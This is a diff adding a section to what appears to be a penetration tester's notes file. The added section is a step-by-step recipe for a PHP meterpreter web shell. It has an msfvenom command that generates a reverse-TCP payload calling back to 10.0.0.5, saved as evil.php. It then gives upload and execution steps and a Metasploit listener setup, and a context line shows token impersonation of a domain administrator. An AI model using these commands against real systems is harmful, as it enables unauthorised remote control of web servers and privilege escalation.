@@ -197,6 +197,20 @@ set LHOST <attack IP>
 exploit
 ------------------------------------------------------------------------------------------------------
 
+# Web shell php meterpreter
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 -f raw > evil.php
+
+Upload file to target web server.
+
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.0.0.5
+exploit
+
+Execute evil.php on web server.
+------------------------------------------------------------------------------------------------------
+
 ===  Below here are OLD notes that have NOT been organized.  ===
 
 meterpreter > impersonate_token DOMAIN\Administrator
